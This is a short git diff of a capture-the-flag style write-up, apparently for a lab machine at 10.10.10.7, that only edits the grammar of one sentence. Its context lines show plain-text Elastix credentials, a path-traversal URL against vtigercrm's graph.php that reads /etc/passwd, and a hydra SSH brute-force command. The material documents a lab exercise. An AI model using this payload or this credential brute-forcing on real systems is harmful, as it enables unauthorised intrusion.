@@ -368,7 +368,7 @@ From here, the Elastix credentials are user `admin` and password `jEhdIekWmdjE`.
 Get the passwd file to list users of the system:
 `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action`
 
-From the passwd file is possible to get usernames, and from the config file passwords. Then it is possible to use hydra to check for matches:
+From the passwd file is possible to get usernames and, from the config file, passwords. Then it is possible to use hydra to check for matches:
 ```
 hydra -L users.txt -P pass.txt 10.10.10.7 -t 4 ssh
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
